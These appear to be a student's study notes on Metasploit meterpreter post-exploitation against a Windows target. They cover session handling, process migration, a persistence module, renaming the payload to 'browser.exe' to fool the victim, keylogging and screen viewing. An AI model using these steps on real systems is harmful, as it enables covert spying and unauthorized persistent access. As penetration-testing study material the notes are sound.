- Here, we're gonna cover what we can do once we get into the target (Server, Client...)
- We'll start if we connect to a Windows machine:

Once we connect to it using mfs, we run the command "exploit" to enter the "meterpreter" mode...
- When we write help, we can see all what we can do including Camera, Mic...
- We can run a meterpreter session in the background, we write "background"
- To see our sessions, and for each session it's target, we write "sessions -i"

- If we run a session in the background, and want to get back to it, we write the command "sessions -i [session_ID]"
- "sysinfo" to see the target machine configurations
- We can write "ps" and kill a target process
- We can do "migrate [Process_ID]"
- "getuid" to get machine name
- For the file system commands we can do are these:

- "Persistance" here means to stay connected to the target without interruptions
- We need to exploit this path "windows/local/persistance"

- The problem here, is that the target can open the task manager, and he can see our process working, so we can change the name to deceive him...
- We write set EXE_NAME [name]
![[Pasted image 20260117114651.png]]
- We write for example "browser.exe"
- To kill the all sessions, "sessions -K"
- For spying purposes, we can see which keyboard buttons are being clicked from, the target...
- If we run the help, we can see a command called "keyscan_start"
- When we want to see what's been written, we write "keyscan_dump"
- Then "keyscan_stop"

- We can also see the target's screen with "screenshare" command
- Pivoting is like accessing and taking control of a machine in a far network, and once seizing control of that target, we attack other devices such as servers, other machines...
